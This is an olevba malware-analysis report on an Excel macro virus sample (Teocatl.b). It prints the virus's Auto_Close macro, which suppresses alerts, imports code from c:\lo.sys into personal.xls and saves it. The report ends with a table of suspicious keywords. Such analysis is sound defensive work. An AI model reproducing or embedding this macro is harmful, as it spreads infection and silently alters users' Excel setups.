olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Teocatl.b-99e86d651503c2aeb865a19053c5c10e33538731
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Tabelle1.cls 
in file: Virus.MSOffice.Teocatl.b-99e86d651503c2aeb865a19053c5c10e33538731 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle2.cls 
in file: Virus.MSOffice.Teocatl.b-99e86d651503c2aeb865a19053c5c10e33538731 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle3.cls 
in file: Virus.MSOffice.Teocatl.b-99e86d651503c2aeb865a19053c5c10e33538731 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO DieseArbeitsmappe.cls 
in file: Virus.MSOffice.Teocatl.b-99e86d651503c2aeb865a19053c5c10e33538731 - OLE stream: '_VBA_PROJECT_CUR/VBA/DieseArbeitsmappe'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO syaDegnartS.bas 
in file: Virus.MSOffice.Teocatl.b-99e86d651503c2aeb865a19053c5c10e33538731 - OLE stream: '_VBA_PROJECT_CUR/VBA/syaDegnartS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Close()
On Error GoTo argh
Application.DisplayAlerts = False
Application.EnableCancelKey = xlDisabled

For i = 1 To Workbooks("personal.xls").VBProject.VBComponents.Count
If Workbooks("personal.xls").VBProject.VBComponents(i).Name = "StrangeDays" Then GoTo argh
Next i

With Workbooks("personal.xls").VBProject
With .VBComponents.Import("c:\lo.sys")
End With
End With

Workbooks("personal.xls").Save
argh:
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

